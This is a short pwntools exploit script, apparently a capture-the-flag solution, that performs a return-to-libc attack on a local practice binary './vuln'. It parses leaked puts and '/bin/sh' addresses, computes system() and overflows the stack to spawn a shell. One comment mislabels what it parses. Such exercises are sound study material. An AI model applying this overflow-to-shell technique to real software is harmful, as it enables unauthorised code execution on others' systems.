# run on Ubuntu18-64bit

from pwn import *
import re

gdb_puts = 0xf7e48460
gdb_system = 0xf7e1de10

eip_offset = 160 		# calculated in gdb 

offset = gdb_puts - gdb_system

elf = ELF("./vuln")
p = elf.process()

prompt = p.recv()

tmp1 = re.split("puts: ", prompt)				# 
tmp2 = re.split("\n", tmp1[1])					# parsing "puts" address from prompt
puts = int(tmp2[0], 16)							#

tmp1 = re.split("useful_string: ", prompt)		# 
tmp2 = re.split("\n", tmp1[1])					# parsing "puts" address from prompt
bin_sh = int(tmp2[0], 16)						#

system = puts - offset

payload = "A" * eip_offset + p32(system) + "JUNK" + p32(bin_sh)
p.sendline(payload)
p.interactive()